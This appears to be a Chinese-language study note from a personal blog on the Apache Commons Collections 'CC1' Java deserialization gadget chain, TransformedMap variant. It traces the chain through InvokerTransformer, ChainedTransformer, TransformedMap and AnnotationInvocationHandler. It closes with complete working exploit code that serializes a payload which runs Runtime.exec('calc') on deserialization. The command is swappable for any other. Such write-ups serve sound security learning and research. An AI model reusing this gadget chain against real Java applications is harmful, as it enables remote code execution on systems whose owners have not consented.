---
title: cc1
date: 2023-04-24 21:36:00
tags:
- web
categories:
- [笔记, web笔记]
---

# TransformedMap版 CC1

#### 链子发现

cc1的最终利用点就是`InvokerTransformer`中的transformer方法，接受一个Object对象，并通过反射的方式执行方法；

![image-20230420223801002](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420223801002.png)

我们利用`InvokerTransformer`中的transformer方法弹计算器进行一个初步测试

![image-20230420225151769](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420225151769.png)

ok测试成功，也就是说利用的最后一个位置已经找到了，我们需要继续找到对应的类中的同名函数进行利用

这个时候我们需要逆推，找到那些类中调用了transform方法，且便于我们利用

![image-20230420234858964](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420234858964.png)

通过查找我们发现有21个方法调用了transform，经过一个个的读取我们发现了我们transformmap可以为我们利用，先看他是因为其多次使用了transform方法所以选择从这里入手

![image-20230420235355079](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230420235355079.png)

我们看一下该类的构造方法

![image-20230421001006012](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001006012.png)

和一些关键函数根据大佬的描述这里主要就是对key和value进行一个装饰，我们进行可以利用其静态方法进行变量的赋值

![image-20230421001807370](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421001807370.png)

但是下一个问题接踵而至，我们如何触发checkSetValue方法，从而执行transform，我们继续跟近源代码

![image-20230421002038025](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421002038025.png)

发现在`AbstractInputCheckedMapDecorator`中`MapEntry`类的`setValue`方法中调用了`checkSetValue`方法，恰巧`TransformedMap`继承于`AbstractInputCheckedMapDecorator`这个类；

现在我们需要找如何触发setvalue方法，Entry==>在hashmap中指一个键值对，可以通过setkey或setvalue的方式改变key和value的值，这里是对setvalue的一个重写

我们进行一个测试看链子是否能通

如下是实现代码：

![image-20230421004133920](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421004133920.png)

测试后弹计算器了说明我们的思路没什么问题；

ok此时我们继续寻找，看如何调用`setvalue`,查看用法时发现在` AnnotationInvocationHandler`类中的readObject方法中调用了`setvalue`

![image-20230421111422420](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421111422420.png)

中`memberValues`调用了setvalue，我们读取其构造方法发现该参数值我们可控

![image-20230421113000784](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421113000784.png)

这里有几个点需要注意，我们发现这个类并不是一个public的类，所以我们需要利用反射的方式去进行调用，思路如下

![image-20230421125031343](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230421125031343.png)

现在遇到了一些问题1、Runtime并没有继承序列化故不满足序列化条件；2、setvalue中传输的对象并不是我们所期望的对象

#### 问题解决

1、Runtime并没有继承序列化故不满足序列化条件（Runtime没有继承Serialize）

```java
//Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化
 Class a = Runtime.class;
 Method method = a.getMethod("getRuntime",null);
 Runtime r = (Runtime) method.invoke(null, null);
 Method execMethod = a.getMethod("exec", String.class);
//计算器测试
 execMethod.invoke(r,"calc");
```

根具上述代码我们将其转换rInvokerTransformer调用的方式

```java
        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
        Runtime invokeMethod = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);
```

但是上述代码并非最佳选择因为我们多次调用transform方法，这里可以使用ChainedTransformer的transform方法来减少调用次数

![image-20230424195149703](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195149703.png)

这里需要注意我们`.transform(Runtime.class);`因为是调用上一个所以我们可以使用ConstantTransformer中的transform方法来输出Runtime.class

```java
//ConstantTransformer中的transform方法
public Object transform(Object input) {
        return iConstant;
    }
```

最终的代码：

```java
Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```



2、` AnnotationInvocationHandler`类中的setvalue方法的使用

AnnotationInvocationHandler的构造方法：

![image-20230424192652479](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192652479.png)

我们看到上面有几个if判断

![image-20230424192243587](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192243587.png)

这里的memberType是去找注释类中的成员方法，但是我们使用的`@Override`是没有成员变量的

![image-20230424192857463](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424192857463.png)

所以我们需要找一个注释中含有成员变量的最终我们锁定了`@Target`

![image-20230424193157726](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193157726.png)

这样我们将a中的key值改为value即可调用setvalue方法；

![image-20230424193249678](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424193249678.png)





#### 最终的exp

![image-20230424195404895](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195404895.png)

执行效果：

![image-20230424195446264](https://picture-1312228068.cos.ap-shanghai.myqcloud.com/image-20230424195446264.png)



最后这里附上所有调试代码

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class Main {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException {
        //利用反射弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        Class a = Runtime.class;
//        Method method = a.getMethod("exec",String.class);
//        method.invoke(runtime,"calc");

        //利用InvokerTransformer弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(runtime);

        //利用TransformedMap弹计算器
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> a = new HashMap<>();
//        a.put("aaa","bbb");
//        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,invokerTransformer);
//
//        for (Map.Entry entry:transformedmap.entrySet()) {
//            entry.setValue(runtime);
//        }

        //缕清思路
//        Runtime runtime = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> a = new HashMap<>();
//        a.put("aaa","bbb");
//        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,invokerTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
//        annotationInvocationHandlerConstructor.setAccessible(true);
//        Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, invokerTransformer);


        //Runtime不能序列化的解决方案===》解决方案：利用class获取runtime最后对Runtime进行反序列化
        //如利用反射机制完成弹计算器
//        Class a = Runtime.class;
//        Method method = a.getMethod("getRuntime",null);
//        Runtime r = (Runtime) method.invoke(null, null);
//        Method execMethod = a.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");

        //实现Method method = a.getMethod("getRuntime",null);
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime invokeMethod = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(invokeMethod);

        //优化减少transform的调用次数
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //简单调试确定能执行弹计算器
        //chainedTransformer.transform(Runtime.class);
        HashMap<Object, Object> a = new HashMap<>();
        a.put("value","bbb");
        Map<Object, Object> transformedmap = TransformedMap.decorate(a,null,chainedTransformer);
        //到此我们已经将Runtime不能反序列化的问题解决了，解析来我们需要解决第二个问题了
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstructor.setAccessible(true);
        Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transformedmap);

        serialize(o);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(Filename));
        Object result = objectInputStream.readObject();
        return result;
    }
}
```





